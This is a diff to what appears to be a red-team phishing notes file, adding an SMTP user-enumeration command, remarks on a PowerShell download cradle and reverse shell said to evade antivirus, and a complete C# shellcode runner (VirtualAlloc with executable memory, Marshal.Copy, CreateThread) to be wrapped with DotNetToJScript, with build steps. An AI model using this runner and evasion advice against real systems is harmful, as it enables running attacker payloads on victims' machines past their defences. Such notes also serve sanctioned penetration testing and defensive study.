@@ -18,7 +18,7 @@ $ smtp-user-enum -M EXPN -D example.com -U users.txt -t 10.0.0.1
 
 **Simple Powershell Download Cradle and RevShell via TCPSocket**
 - Can evade AV because of the use of "non-standard" var names
-- Note if you dont see the run.txt being downloaded, it may be because the method of New-Object System.Net.WebClient is restricted. You can use IWR instead
+- Note if you dont see the run.txt being downloaded, it may be because the method of New-Object System.Net.WebClient is restricted by CLM. You can use IWR instead
 ```html
 <html>
 <head>
@@ -77,6 +77,48 @@ self.close();
 </html>
 ```
 
+**C# Shellcode Runner + DOTNET2JS**
+- hmm stealthy? No Powershell at least
+- Spin up the dotnet2js sln file; Remember to comment out the dotnet v2 line in Program.cs of the main project
+- In the ExampleAssembly's TestClass.cs, put the following code. Compiled in x64
+
+```csharp
+using System;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+using System.Windows.Forms;
+
+[ComVisible(true)]
+public class TestClass
+{
+    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
+  uint flAllocationType, uint flProtect);
+
+    [DllImport("kernel32.dll")]
+    static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize,
+      IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+
+    [DllImport("kernel32.dll")]
+    static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
+
+    public TestClass()
+    {
+        byte[] buf = <shellcode here x64>;
+
+        int size = buf.Length;
+
+        IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
+
+        Marshal.Copy(buf, 0, addr, size);
+
+        IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
+
+        WaitForSingleObject(hThread, 0xFFFFFFFF);
+    }
+}
+
+```
 
 
 ### Sending the email!
